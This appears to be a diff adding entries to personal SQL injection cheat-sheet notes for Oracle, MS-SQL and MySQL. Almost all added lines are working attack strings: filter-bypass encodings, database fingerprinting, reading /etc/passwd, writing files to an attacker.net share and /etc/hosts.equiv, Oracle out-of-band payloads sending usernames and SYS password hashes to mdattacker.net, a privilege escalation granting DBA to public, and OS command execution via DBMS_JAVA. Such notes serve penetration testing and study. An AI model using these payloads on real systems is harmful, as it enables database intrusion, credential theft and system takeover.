@@ -7,6 +7,38 @@
 
 - <http://pentestmonkey.net/category/cheat-sheet/sql-injection>
 - <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection>
+-  The following examples show how the string services could be constructed on the common types of database:
+   - Oracle: ‘serv’||’ices’
+   - MS-SQL: ‘serv’+’ices’
+   - MySQL:‘serv’ ‘ices’(notethespace)
+- If you are injecting into numeric data, the following attack strings can be used to fingerprint the database. Each of these items evaluates to 0 on the target database and generates an error on the other databases:
+  - Oracle: BITAND(1,1)-BITAND(1,1)
+  - MS-SQL: @@PACK_RECEIVED-@@PACK_RECEIVED
+  - MySQL: CONNECTION_ID()-CONNECTION_ID()
+- Join
+  - Oracle: SELECT table_name||’:’||column_name FROM all_tab_columns
+  - MS-SQL: SELECT table_name+’:’+column_name from information_ schema.columns
+  - MySQL: SELECT CONCAT(table_name,’:’,column_name) from information_schema.columns
+- Block
+  - select ename, sal from emp where ename=’marcus’:
+    - Oracle: SELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)||CHR(114)||CHR(99)||CHR(117)||CHR(115)
+    - MySQL: SELECT ename, sal FROM emp WHERE ename=CHAR(109)+CHAR(97)+CHAR(114)+CHAR(99)+CHAR(117)+CHAR(115)
+  - SELECT
+    - SeLeCt
+    - %00SELECT
+    - SELSELECTECT
+    - %53%45%4c%45%43%54
+    - %2553%2545%254c%2545%2543%2554
+  - Spaces
+    - SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
+    - SEL/*foo*/ECT username,password FR/*foo*/OM users
+
+
+![](res/2021-02-22-23-06-34.png)
+![](res/2021-02-22-23-06-58.png)
+![](res/2021-02-22-23-08-01.png)
+![](res/2021-02-22-23-08-23.png)
+
 
 ## SqlServer 
 
@@ -155,6 +187,14 @@ select * from MyTable;
 - Bypass
   - Avoid quotes: `select concat('1337','aaaa')` == `select concat(0x31333337,0x61616161)`
 - List udf: `select * from mysql.func`
+- `select * into outfile ‘\\\\attacker.net\\share\\output.txt’ from users;`
+  ```sql 
+  create table test (a varchar(200))
+  insert into test(a) values (‘+ +’)
+  select * from test into outfile ‘/etc/hosts.equiv’
+  ```
+- `select load_file(‘/etc/passwd’)`
+- `admin’ AND ASCII(SUBSTRING(‘Admin’,1,1)) = 65--`
 
 ### Privilege Escalation
 
@@ -413,6 +453,16 @@ connect_back(PG_FUNCTION_ARGS)
 }
 ```
 ## Oracle 
+
+- `7521’||UTL_HTTP.request(‘mdattacker.net:80/’|| (SELECT%20username%20FROM%20all_users%20WHERE%20ROWNUM%3d1))--`
+- `7521’||UTL_INADDR.GET_HOST_NAME((SELECT%20PASSWORD% 20FROM%20DBA_USERS%20WHERE%20NAME=’SYS’)||’.mdattacker.net’)`
+- UTL_SMTP
+- UTL_TCP
+- `SYS.DBMS_LDAP.INIT((SELECT PASSWORD FROM SYS.USER$ WHERE NAME=’SYS’)||’.mdsec.net’,80)`
+- `select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‘INDX’,’SCH’, ‘TEXTINDEXMETHODS”.ODCIIndexUtilCleanup(:p1); execute immediate ‘’declare pragma autonomous_transaction; begin execute immediate ‘’’’grant dba to public’’’’ ; end;’’; END;--’,’CTXSYS’,1,’1’,0) from dual`
+- `DBMS_JAVA.RUNJAVA(‘oracle/aurora/util/Wrapper c:\\windows\\system32\\ cmd.exe /c dir>c:\\OUT.LST’)`
+  - <www.databasesecurity.com/HackingAurora.pdf>
+  - <www.notsosecure.com/folder2/2010/08/02/blackhat-2010/>
 
 ### RCE 
 
